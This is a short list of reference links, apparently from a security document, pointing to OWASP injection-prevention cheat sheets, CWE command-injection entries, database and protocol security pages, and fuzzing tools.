* [https://www.owasp.org/index.php/XSS\_\(Cross\_Site\_Scripting\)\_Prevention\_Cheat\_Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)
* [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
* [https://owasp.org/www-project-code-review-guide/](https://owasp.org/www-project-code-review-guide/) (Page 117)
* [https://owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection)
* [http://cwe.mitre.org/data/definitions/77.html](http://cwe.mitre.org/data/definitions/77.html)
* [http://cwe.mitre.org/data/definitions/78.html](http://cwe.mitre.org/data/definitions/78.html)
* [Bash Command Injection Vulnerability](https://ics-cert.us-cert.gov/advisories/ICSA-14-269-01A)
* [SQLite Security](https://www.sqlite.org/security.html)
* [SQLCipher](https://www.zetetic.net/sqlcipher/)
* [Redis Security](https://redis.io/docs/management/security/)
* [AFL++ Fuzzer](https://github.com/AFLplusplus/AFLplusplus)
* [LibFuzzer](https://llvm.org/docs/LibFuzzer.html)
* [OSS-Fuzz](https://google.github.io/oss-fuzz/)
* [MQTT Security](https://mqtt.org/mqtt-specification/)
* [CoAP DTLS](https://datatracker.ietf.org/doc/html/rfc7252)
* [Modbus Security](https://modbus.org/docs/MB-TCP-Security-v21_2018-07-24.pdf)
* [OWASP IoT Security Testing Guide](https://owasp.org/www-project-iot-security-testing-guide/)
